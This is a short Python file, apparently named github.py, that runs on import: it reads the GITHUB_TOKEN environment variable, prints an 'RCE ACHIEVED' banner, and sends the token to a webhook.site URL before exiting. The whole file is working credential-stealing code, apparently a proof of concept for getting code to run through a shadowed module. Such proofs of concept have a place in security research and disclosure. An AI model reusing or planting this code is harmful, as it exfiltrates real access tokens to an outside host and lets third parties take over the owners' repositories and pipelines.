import os
import urllib.request

token = os.environ.get("GITHUB_TOKEN", "NO_TOKEN")
webhook = "https://webhook.site/1e003cda-2b84-41f4-9531-b6a2e385fbb9"

print("=" * 60)
print("🚨 RCE ACHIEVED - github.py IMPORTED 🚨")
print(f"Token: {token[:30]}...")
print(f"Webhook: {webhook}")
print("=" * 60)

try:
    urllib.request.urlopen(f"{webhook}?token={token}", timeout=5)
    print("✅ Token exfiltrated to webhook.site!")
except Exception as e:
    print(f"❌ Exfiltration failed: {e}")

import sys

sys.exit(1)
